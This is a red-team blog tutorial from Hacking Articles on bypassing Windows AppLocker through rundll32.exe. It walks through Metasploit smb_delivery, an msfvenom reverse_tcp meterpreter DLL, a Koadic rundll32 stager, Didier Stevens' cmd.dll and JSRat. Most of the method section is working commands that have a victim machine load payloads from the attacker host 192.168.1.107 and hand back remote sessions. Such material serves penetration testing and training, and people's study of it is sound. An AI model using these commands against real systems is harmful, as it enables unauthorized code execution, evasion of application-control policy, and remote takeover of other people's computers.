<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a>, <a href="https://www.hackingarticles.in/category/red-teaming/windows-exploitation/" rel="category tag">Windows Exploitation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Exploitation: rundll32.exe</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-exploitation-rundll32-exe/" rel="bookmark"><time class="entry-date published" datetime="2019-01-24T12:40:07+00:00">January 24, 2019</time><time class="updated" datetime="2025-05-15T18:08:45+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This article demonstrates the most common and familiar techniques of whitelisting AppLocker bypass. As we know for security reasons, the system admin add group policies to restrict app execution for a local user. In our previous article, we had discussed “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/">Windows Applocker Policy – A Beginner’s Guide</a>,</strong>” as it defines the AppLocker rules for your application control policies and how to work with them. But today you will learn how to bypass Applocker policies with RunDLL files.</span></p>
<h3><span style="color: #800000;"><strong>Tables of Content</strong></span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction</span></strong></li>
<li><strong><span style="color: #000000;">Working of DLL files</span></strong></li>
<li><strong><span style="color: #000000;">Advantages</span></strong></li>
<li><strong><span style="color: #000000;">Disadvantages</span></strong></li>
<li><strong><span style="color: #000000;">Different methods for AppLocker Bypass using DLL files</span></strong></li>
<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span></span></h3>
<p><span style="color: #000000;">DLL files are very important for window’s OS to work and it also determines the working of other programs that customize your windows. Dynamic Link Library (DLL) files are the type of file that provides instructions to other programs on how to call upon certain things. Therefore, multiple software’s can share such DLL files, even simultaneously. In spite of being in the same format as a .exe file, DLL files are not directly executable like .exe files. DLL file extensions can be : .dll (Dynamic Link Library), .OCX (ActiveX Controls), .CPL (Control Panel), .DRV (Device Drivers).</span></p>
<h3><span style="color: #800000;">Working</span></h3>
<p><span style="color: #000000;">When in use, DLL files are divided into sections. This makes the working of DLL files easy and faster. Each section is installed in the main program at run time. As each section is different and independent; load time is faster and is only done when the functionality of the said file is required. This ability also makes upgrades easier to apply without affecting other sections. For example, you have a dictionary program and new words are added every month, so for this, all you have to do is update it; without requiring to install a whole another program for it.</span></p>
<h3><span style="color: #800000;">Advantages</span></h3>
<ul>
<li><span style="color: #000000;">Uses fewer resources</span></li>
<li><span style="color: #000000;">Promotes modular architecture</span></li>
<li><span style="color: #000000;">Eases deployment and installation</span></li>
</ul>
<h3><span style="color: #800000;">Disadvantages</span></h3>
<ul>
<li><span style="color: #000000;">A dependent DLL is upgraded to a new version.</span></li>
<li><span style="color: #000000;">A dependent DLL is fixed.</span></li>
<li><span style="color: #000000;">A dependent DLL is overwritten with an earlier version.</span></li>
<li><span style="color: #000000;">A dependent DLL is removed from the computer.</span></li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Methods</span> </span></h3>
<ul>
<li><span style="color: #000000;">Smb_Delivery</span></li>
<li><span style="color: #000000;">MSFVenom</span></li>
<li><span style="color: #000000;">Koadic</span></li>
<li><span style="color: #000000;">Get-Command Prompt via cmd.dll</span></li>
<li><span style="color: #000000;">JSRat</span></li>
</ul>
<h4><span style="color: #800000;">SMB Delivery</span></h4>
<p><span style="color: #000000;">So, our method is using smb_delivery. To use this method, open the terminal in kali and type the following commands ;</span></p>
<h5><strong><span style="color: #000000;">msfconsole</span></strong></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/smb_delivery
set srvhost 192.168.1.107
exploit</pre>
<p><span style="color: #000000;">Now run the malicious code through rundll32.exe in the windows machine to obtain meterpreter sessions.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-gx3QGhSxS6s/XEmsiOdFurI/AAAAAAAAcWI/Nsq5HsYfLYw3bfeNyO-5CVqsdf0YBVxdACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As the above exploit will run, it will provide you with a command that is to be executed on the victim’s PC; in order to get a session. So copy and paste the given command in the run window of the victim’s PC as shown in the image below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rundll32.exe \\192.168.1.107\ZtmW\test.dll,0</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-qvaHJInvIyY/XEmsknaxUHI/AAAAAAAAcWo/2SlYISXH-FYUyfeere1XksN8DDlQHI3MACLcBGAs/s1600/2.png" alt="Windows Exploitation using Rundll32.exe" width="405" height="209"/></span></p>
<p><span style="color: #000000;">As soon as the command is executed, you will have your meterpreter session. To access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-vKL3mgvE7xU/XEmslNUar8I/AAAAAAAAcWw/Ta20l9xG5iESlRLmF4o1Vuz0N7eBpaMNwCLcBGAs/s1600/3.png"/></span></p>
<h4><span style="color: #800000;">MSFVenom</span></h4>
<p><span style="color: #000000;">Our second method is via MSFVenom. For the utilization of this method, type the following command in the terminal of kali :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 -f dll &gt; 1.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-62xSzKubBSE/XEmslc235WI/AAAAAAAAcW4/Ciasn3Fh7ywzpkeZXazDZey1FjBXC3qrgCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Once the payload is created, run the following command in the Run window of the victim’s PC:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rundll32 shell32.dll,Control_RunDLL C:\Users\raj\Downloads\1.dll</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-cu1XQKE4mN8/XEmslaZ1rLI/AAAAAAAAcW0/wlZ_ynplYTsSOPUHPp3_E31TvIHHmCSbQCLcBGAs/s1600/5.png" alt="Windows Exploitation using Rundll32.exe" width="407" height="205"/></span></p>
<p><span style="color: #000000;">Simultaneously, start the multi/handler to get a session by typing :</span></p>
<h5><span style="color: #000000;"><strong>msfconsole </strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set payload windows/meterpreter/reverse_tcp 
set lhost 192.168.1.107 
set lport 1234 
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-JnMvQbp6PmE/XEmslzMjppI/AAAAAAAAcW8/c8d_QMBoSO0QcC5UhSldtCdDUGPxVZiygCLcBGAs/s1600/6.png"/></span></p>
<h4><span style="color: #800000;">Koadic</span></h4>
<p><span style="color: #000000;">Our next method is using Koadic framework. Koadic is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. To know more about Koadic please read our detailed articled on the said framework through this link: <span style="color: #0000ff;"><em><a style="color: #0000ff;" href="https://www.hackingarticles.in/koadic-com-command-control-framework">https://www.hackingarticles.in/koadic-com-command-control-framework</a></em></span></span></p>
<p><span style="color: #000000;">Once the koadic is up and running, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use stager/js/rundll32_js
set SRVHOST 192.168.1.107
run</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-VNp3QnnT5VE/XEmsmbXrW6I/AAAAAAAAcXA/ccRTnT4vHQoROCOyKheP1UMyVJXFo6GFgCLcBGAs/s1600/8.png" alt="Windows Exploitation using Rundll32.exe" width="1001" height="511"/></span></p>
<p><span style="color: #000000;">Running the exploit will give you a command. Copy that command from rundll32.exe to 6.0”) and paste it in the command prompt of the victims’ PC.</span></p>
<p><span style="color: #000000;">Once you run the command in the cmd, you will have your session. As shown in the following image.</span></p>
<p><span style="color: #000000;">To access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">zombies 0</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-4O5zRmZ1-fo/XEmsmR0cuEI/AAAAAAAAcXE/lrF6lWSEhAo9CVI3hzH6vk_FbuE0LKtSQCLcBGAs/s1600/9.png"/></span></p>
<h4><span style="color: #800000;">Get-Command Prompt via cmd.dll </span></h4>
<p><span style="color: #000000;">Now the dilemma is, what to do if the command prompt is blocked in victim’s PC.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-K8r7AOOvK98/XEmsiG-KlUI/AAAAAAAAcWQ/e7bz0noIBvYAOiurVbOpFgjnPCsC0a4sgCLcBGAs/s1600/10.1.png"/></span></p>
<p><span style="color: #000000;">If the command line is blocked, you can use a script developed by Didier Stevens to solve your little problem. You can find them in the following link :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://didierstevens.com/files/software/cmd-dll_v0_0_4.zip</pre>
<p><span style="color: #000000;">In the above URL, you will download a zip file. Extract that zip file and use the following command to run the said file in run windows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">rundll32 shell32.dll,Control_RunDLL C:\Users\raj\Downloads\cmd.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-HR4sdzqTbys/XEmsiJtkVQI/AAAAAAAAcWM/VRyj5vFcMO0IpLEh-ccceD5wOrXYpb6zQCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">As soon as you run the command, you will have an unblocked the cmd. As shown below:</span></p>
<p><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-ReQUO-bM1BE/XEmsjBG38AI/AAAAAAAAcWU/83uZDt06rX8SHLWTYCqjlg0wA1e45K4XACLcBGAs/s1600/11.png" alt="Windows Exploitation using Rundll32.exe" width="665" height="334"/></p>
<h4><span style="color: #800000;">JSRat</span></h4>
<p><span style="color: #000000;">Our next method of attacking regsvr32 is by using JSRat and you can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="//github.com/Hood3dRob1n/JSRat-Py">GitHub</a></strong></span>. This is another command and control framework just like koadic and Powershell Empire for generating malicious task only for rundll32.exe and regsvr32.exe. JSRat will create a web server and on that web server, we will find our .js file. To use this method type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./JSRat.py -i 192.168.1.107 -p 4444</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-T1_Uj9FrEUo/XEmsjSla4RI/AAAAAAAAcWY/Myk-0Vh9-50tLhaKb3cIyDI-4h3yR8mLgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Once JSRat starts working, it will give you a link to open in the browser. That web page will execute code on the victim’s PC.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Jnjc5I3uCjs/XEmsjQmLjVI/AAAAAAAAcWc/yodpAmfl3OMUXyFU2ft3E50-7yU5YIRsACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Therefore, open the //192.168.1.107/wtf link in your browser. There you will find the said code as shown in the image below:</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-gTua884nNOI/XEmsj-aa2hI/AAAAAAAAcWg/h5g_4TQh05YxSN2Ye7IuXgmcHOMu7T9_gCLcBGAs/s1600/14.png" alt="Windows Exploitation using Rundll32.exe" width="771" height="284"/></span></p>
<p><span style="color: #000000;">Run that code in the command prompt of the victims’ PC as shown:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-Jt7ToE30boM/XEmskaRuY6I/AAAAAAAAcWk/NqohrbDteqM9AZ6RDzirPBSgFdZgfUIAgCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">And voila, you will have a session as the image below:</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-9uGncDXHfdI/XEmsknkxdeI/AAAAAAAAcWs/-9-xWvPP8JAclyUJEzt5hnMc3sPQ3GPZwCLcBGAs/s1600/16.png" alt="Windows Exploitation using Rundll32.exe" width="690" height="865"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">DLL files are a collection of various codes and procedures held together. These files help Windows programs to execute accurately. Multiple programs created these files to use them simultaneously. This technique helps in memory conservation. Therefore, these files are important and required by Windows to run properly without giving users any kind of problems. Hence, exploitation through such files is very efficient and lethal. And above-presented methods are different ways to do it.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <span style="color: #0000ff;"><strong><a class="broken_link" style="color: #0000ff;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
